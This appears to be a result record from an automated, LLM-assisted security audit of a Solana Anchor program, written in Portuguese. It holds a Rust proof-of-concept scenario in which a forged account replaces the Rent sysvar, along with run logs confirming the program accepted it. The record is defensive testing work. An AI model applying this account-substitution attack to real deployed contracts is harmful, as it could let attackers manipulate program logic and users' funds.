@@ -1,0 +1,95 @@
+{
+  "category": "SYSVAR",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: conta forjada aceita no lugar do Sysvar Rent",
+  "attempts_used": 1,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2096,
+        "completion_tokens": 489,
+        "latency_s": 3.34
+      },
+      "raw": "{\n  \"plan\": \"O programa-alvo recebe uma conta `rent` como AccountInfo genérico, sem validar que seu endereço é o ID oficial do Sysvar Rent. O baseline usa a conta real do Sysvar Rent (endereço oficial) e deve ter sucesso. O ataque substitui essa conta por uma conta forjada com dados controlados pelo atacante, mantendo o mesmo layout. O efeito medido é que a conta forjada foi aceita no lugar do Sysvar, demonstrando a falta de validação de endereço.\",\n  \"scenario\": \"let rent_id = solana_program::sysvar::rent::ID;\\nlet rent_account = account(&rent_id, &[], None);\\nlet contas_baseline = vec![(rent_id, rent_account.clone())];\\nlet ix_baseline = env.anchor_ix(\\\"check_sysvar_address\\\", &(), vec![AccountMeta::new_readonly(rent_id, false)]);\\nlet r_base = env.baseline(\\\"uso legitimo com Sysvar Rent real\\\", &ix_baseline, &contas_baseline);\\n\\nlet fake_rent_id = Pubkey::new_unique();\\nlet fake_rent_data = vec![0u8; 17];\\nlet fake_rent_account = account(&fake_rent_id, &fake_rent_data, None);\\nlet contas_ataque = vec![(fake_rent_id, fake_rent_account.clone())];\\nlet ix_ataque = env.anchor_ix(\\\"check_sysvar_address\\\", &(), vec![AccountMeta::new_readonly(fake_rent_id, false)]);\\nlet r_ataque = env.attack(\\\"conta forjada no lugar do Sysvar Rent\\\", &ix_ataque, &contas_ataque);\\n\\nif r_ataque.program_result == ProgramResult::Success {\\n    let conta_depois = after(&r_ataque, &fake_rent_id);\\n    env.effect(\\\"conta forjada aceita no lugar do Sysvar Rent\\\", conta_depois.data() == fake_rent_data.as_slice());\\n}\"\n}",
+      "plan": "O programa-alvo recebe uma conta `rent` como AccountInfo genérico, sem validar que seu endereço é o ID oficial do Sysvar Rent. O baseline usa a conta real do Sysvar Rent (endereço oficial) e deve ter sucesso. O ataque substitui essa conta por uma conta forjada com dados controlados pelo atacante, mantendo o mesmo layout. O efeito medido é que a conta forjada foi aceita no lugar do Sysvar, demonstrando a falta de validação de endereço.",
+      "scenario": "let rent_id = solana_program::sysvar::rent::ID;\nlet rent_account = account(&rent_id, &[], None);\nlet contas_baseline = vec![(rent_id, rent_account.clone())];\nlet ix_baseline = env.anchor_ix(\"check_sysvar_address\", &(), vec![AccountMeta::new_readonly(rent_id, false)]);\nlet r_base = env.baseline(\"uso legitimo com Sysvar Rent real\", &ix_baseline, &contas_baseline);\n\nlet fake_rent_id = Pubkey::new_unique();\nlet fake_rent_data = vec![0u8; 17];\nlet fake_rent_account = account(&fake_rent_id, &fake_rent_data, None);\nlet contas_ataque = vec![(fake_rent_id, fake_rent_account.clone())];\nlet ix_ataque = env.anchor_ix(\"check_sysvar_address\", &(), vec![AccountMeta::new_readonly(fake_rent_id, false)]);\nlet r_ataque = env.attack(\"conta forjada no lugar do Sysvar Rent\", &ix_ataque, &contas_ataque);\n\nif r_ataque.program_result == ProgramResult::Success {\n    let conta_depois = after(&r_ataque, &fake_rent_id);\n    env.effect(\"conta forjada aceita no lugar do Sysvar Rent\", conta_depois.data() == fake_rent_data.as_slice());\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "uso legitimo com Sysvar Rent real",
+            "result": "Success",
+            "compute_units": 11180,
+            "account_flags": "-r",
+            "ix_head": "d7185552e7555289",
+            "accounts": [
+              {
+                "key": "SysvarRent111111111111111111111111111111111",
+                "signer": false,
+                "writable": false,
+                "owner": "SysvarRent111111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "conta forjada no lugar do Sysvar Rent",
+            "result": "Success",
+            "compute_units": 7788,
+            "account_flags": "-r",
+            "ix_head": "d7185552e7555289",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": false,
+                "owner": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "data_len": 17,
+                "head": "0000000000000000",
+                "digest": "0a88111852095cae",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "conta forjada aceita no lugar do Sysvar Rent",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 11180 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 7788 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: conta forjada aceita no lugar do Sysvar Rent"
+    }
+  ],
+  "case_id": "SL-10-INS",
+  "static_finding": {
+    "category": "SYSVAR",
+    "confidence": "high",
+    "evidence": "rent: AccountInfo<'info>,",
+    "explanation": "A conta de Sysvar 'rent' e recebida como AccountInfo generico, sem validacao de que sua chave publica corresponde ao ID oficial do Sysvar Rent (solana_program::sysvar::rent::ID). O Anchor nao valida automaticamente o ID de Sysvar quando o tipo e AccountInfo.",
+    "attack_hypothesis": "Um atacante forneceria uma conta arbitraria no lugar do Sysvar Rent. Se o handler lesse os dados dessa conta (ex: taxa de rent), obteria valores controlados pelo atacante, podendo manipular a logica do programa que depende do Rent."
+  }
+}
